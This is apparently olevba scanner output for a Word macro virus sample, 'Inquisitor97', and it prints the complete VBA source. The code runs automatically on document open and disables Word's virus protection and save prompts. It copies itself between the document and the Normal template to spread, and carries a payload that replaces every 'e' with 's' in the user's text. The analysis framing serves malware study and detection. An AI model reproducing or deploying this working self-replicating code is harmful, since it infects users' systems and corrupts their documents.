olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Inquisitor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Inquisitor - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Inquisitor - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1 
in file: Virus.MSWord.Inquisitor - OLE stream: 'Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False
Call Inquisitor97
Call Payload(Int(Rnd(100)))
End Sub

Sub Inquisitor97()
On Error Resume Next
Set test = MacroContainer
If test = NormalTemplate Then Call n
If test = ActiveDocument Then Call a
End Sub

Sub n()
On Error Resume Next
Application.OrganizerDelete ActiveDocument.FullName, "Module1", wdOrganizerObjectProjectItems
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Module1", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub a()
On Error Resume Next
Application.OrganizerDelete NormalTemplate.FullName, "Module1", wdOrganizerObjectProjectItems
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Module1", wdOrganizerObjectProjectItems
NormalTemplate.Save
End Sub
Sub ToolsMacro()
MsgBox "You have been infected by Inquisitor97"
Payload (42)
End Sub
Sub ViewVBCode()
MsgBox "You have been infected by Inquisitor97"
Payload (42)
End Sub
Sub Payload(num As Single)
If num = 42 Then
    
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "e"
        .Replacement.Text = "s"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+----------+--------------------+---------------------------------------------+

